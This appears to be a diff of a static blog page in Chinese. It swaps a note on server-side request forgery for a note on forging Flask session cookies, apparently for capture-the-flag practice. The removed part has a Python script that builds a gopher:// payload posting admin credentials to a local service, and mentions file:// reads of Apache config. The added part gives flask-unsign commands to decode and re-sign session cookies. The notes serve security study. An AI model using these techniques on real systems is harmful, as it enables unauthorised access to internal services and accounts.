@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;333318.html 利用一个可以发起网络请求的服务当作跳板来访问并攻击内部其他服务 可用点：	协议	 file:&#x2F;&#x2F; 、gopher:&#x2F;&#x2F; 、dict 、http		1. 其中file协议用于访问内网文件,比如apache配置文件 &#x2F;etc&#x2F;apache2&amp;#x">
+    <meta name="description" content="flask框架中的session由三部分组成 12# session示例eyJhZG1pbiI6MH0.Z4TvGQ.6pZj4EsHiALdBjTc_STIl9XRU5Q 第一部分是base64编码的结果, 这里解码后就是 1&#123;&quot;admin&quot;:0&#125; 第二部分 时间戳，说明session时间长会过期第三部分对数据和时间戳hmac session工作流程  用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="mekrina">
-<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/ssrf%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/index.html">
+<meta property="og:title" content="python session伪造">
+<meta property="og:url" content="http://mekrina.github.io/blogs/python/python%20session%E4%BC%AA%E9%80%A0/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;333318.html 利用一个可以发起网络请求的服务当作跳板来访问并攻击内部其他服务 可用点：	协议	 file:&#x2F;&#x2F; 、gopher:&#x2F;&#x2F; 、dict 、http		1. 其中file协议用于访问内网文件,比如apache配置文件 &#x2F;etc&#x2F;apache2&amp;#x">
+<meta property="og:description" content="flask框架中的session由三部分组成 12# session示例eyJhZG1pbiI6MH0.Z4TvGQ.6pZj4EsHiALdBjTc_STIl9XRU5Q 第一部分是base64编码的结果, 这里解码后就是 1&#123;&quot;admin&quot;:0&#125; 第二部分 时间戳，说明session时间长会过期第三部分对数据和时间戳hmac session工作流程  用">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-08T03:51:01.156Z">
-<meta property="article:modified_time" content="2025-02-28T14:52:10.833Z">
+<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-03-08T04:17:04.635Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>mekrina</title>
+  <title>python session伪造 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="python session伪造"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-08 11:51" pubdate>
-          2025年3月8日 中午
+        <time datetime="2025-01-20 21:06" pubdate>
+          2025年1月20日 晚上
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          289 字
+          150 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          3 分钟
+          2 分钟
         
       </span>
     
@@ -270,22 +270,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">python session伪造</h1>
             
             
               <div class="markdown-body">
                 
-                <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html</a></p>
-<p><strong>利用一个可以发起网络请求的服务当作跳板来访问并攻击内部其他服务</strong></p>
-<p>可用点：<br>	<strong>协议</strong><br>	 file:&#x2F;&#x2F; 、gopher:&#x2F;&#x2F; 、dict 、http<br>		1. 其中file协议用于访问内网文件,比如apache配置文件 &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf，可以查看哪些端口是开放的, (其实访问的是file:&#x2F;&#x2F;localhost&#x2F;etc&#x2F;…)<br>		2. gopher:&#x2F;&#x2F; 协议可以发送post数据，还可以进行反向shell</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>content = <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span><br>content_length = <span class="hljs-built_in">len</span>(content)<br>test =\<br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">User-Agent: curl/7.43.0</span><br><span class="hljs-string">Accept: */*</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,content_length,content)<br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br></code></pre></td></tr></table></figure>
-<p>本质上是</p>
+                <p>flask框架中的session由三部分组成</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># session示例</span><br><span class="hljs-attribute">eyJhZG1pbiI6MH0</span>.Z4TvGQ.<span class="hljs-number">6</span>pZj4EsHiALdBjTc_STIl9XRU5Q<br></code></pre></td></tr></table></figure>
+<p><strong>第一部分</strong>是base64编码的结果, 这里解码后就是</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p><strong>第二部分</strong> 时间戳，说明session时间长会过期<br><strong>第三部分</strong><br>对数据和时间戳hmac</p>
+<p>session工作流程</p>
 <ol>
-<li>先对请求进行url编码</li>
-<li>把%0a替换成%0d%0a</li>
-<li>对请求中进行url编码<br>burpsuite会对请求自动进行url解码一次，因此用burpsuite要比用python多编码一次。用python可以省去最后一步</li>
+<li>用户访问，服务端给标示（如{“admin”:0}）、uid，对这些数据进行认证，附加到session字符串中</li>
+<li>用户带着session字符串访问服务端，服务器对session进行认证，与原有mac进行比较。相同则认证成功。</li>
 </ol>
-<p>访问本地web服务时，默认使用80端口</p>
+<p>解题流程</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">flask-unsign -d -c COOKIE<br>flask-unsign -s -c COOKIE --secret SECRET<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -293,6 +294,27 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/blogs/categories/python/" class="category-chain-item">python</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
   
   
 </div>
@@ -303,8 +325,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>http://mekrina.github.io/blogs/uncategorized/ssrf服务器端请求伪造/</div>
+      <div>python session伪造</div>
+      <div>http://mekrina.github.io/blogs/python/python session伪造/</div>
     </div>
     <div class="license-meta">
       
@@ -316,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月8日</div>
+          <div>2025年1月20日</div>
         </div>
       
       
@@ -348,9 +370,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/uncategorized/sql%E6%B3%A8%E5%85%A5/" title="">
+                      <a href="/blogs/php/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" title="php文件包含漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
+                        <span class="hidden-mobile">php文件包含漏洞</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -358,8 +380,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/uncategorized/tricks/" title="">
-                        <span class="hidden-mobile"></span>
+                      <a href="/blogs/uncategorized/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        <span class="hidden-mobile">sql注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
